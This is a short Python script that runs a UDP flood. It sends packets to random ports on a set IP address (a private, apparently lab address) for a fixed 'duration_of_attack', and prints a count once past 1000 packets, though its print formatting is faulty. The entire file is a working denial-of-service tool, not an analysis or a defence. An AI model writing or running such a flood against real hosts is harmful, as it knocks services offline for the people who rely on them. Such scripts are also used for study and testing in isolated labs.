import time
import socket
import random
import sys

target_ip_address = "10.0.2.15"

duration_of_attack = 120 # in seconds

# Creating UDP Socket
UDP_sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) 

# Creating Packet
packet_msg = bytes(random.getrandbits(10))
timeout = time.time() + duration_of_attack
sent_packets_variable = 0
while time.time() < timeout:
  target_port_number = random.randint(1025, 65356)
  UDP_sock.sendto(packet_msg, (target_ip_address, target_port_number))
  sent_packets_variable += 1
  if sent_packets_variable > 1000:
    print("Number of packets sent = %d", sent_packets_variable)
